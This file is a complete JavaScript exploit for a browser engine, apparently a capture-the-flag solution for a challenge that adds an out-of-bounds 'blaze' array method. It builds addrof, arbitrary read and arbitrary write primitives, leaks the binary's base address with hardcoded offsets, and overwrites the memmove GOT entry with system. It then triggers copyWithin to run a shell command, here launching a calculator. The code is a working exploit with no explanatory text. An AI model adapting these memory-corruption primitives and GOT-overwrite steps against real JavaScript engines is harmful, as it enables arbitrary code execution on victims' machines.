let buf = new ArrayBuffer(8);
let f64 = new Float64Array(buf);
let i64 = new BigUint64Array(buf);

const ftoi = x => {
  f64[0] = x;
  return i64[0];
};

const itof = x => {
  i64[0] = x;
  return f64[0];
};

let oob = new Array(1.1, 2.2, 3.3);
let rdw = new BigUint64Array(1);             /* rdw.data_slot @ oob[13] */
let obj = new Array({a: 1}, {b: 2}, {c: 3}); /* obj.elements  @ oob[21] */

oob.blaze();

/* addrof primitive */
const addrof = o => {
  let tmp = oob[13];
  oob[13] = oob[21];

  obj[0] = o;
  let ret = rdw[0] & 0xffffffffffffn;

  oob[13] = tmp;
  return ret;
};

/* arbitrary 64-bit read */
const read = p => {
  let tmp = oob[13];
  oob[13] = itof(p);

  let ret = rdw[0];
  oob[13] = tmp;
  return ret;
};

/* arbitrary 64-bit write */
const write = (p, x) => {
  let tmp = oob[13];
  oob[13] = itof(p);

  rdw[0] = x;
  oob[13] = tmp;
};

let elf = read(addrof(oob) + 8n) - 0x245e98n;

let got = {
  memmove: elf + 0x23d7400n,
  system:  elf + 0x23d7190n
};

let system = read(got.system);
write(got.memmove, system);

let pwn = new Uint8Array(32);
let cmd = '/usr/bin/xcalc';

for (let i = 0; i < cmd.length; i++)
  pwn[i] = cmd.charCodeAt(i); 

pwn.copyWithin(0, 16);
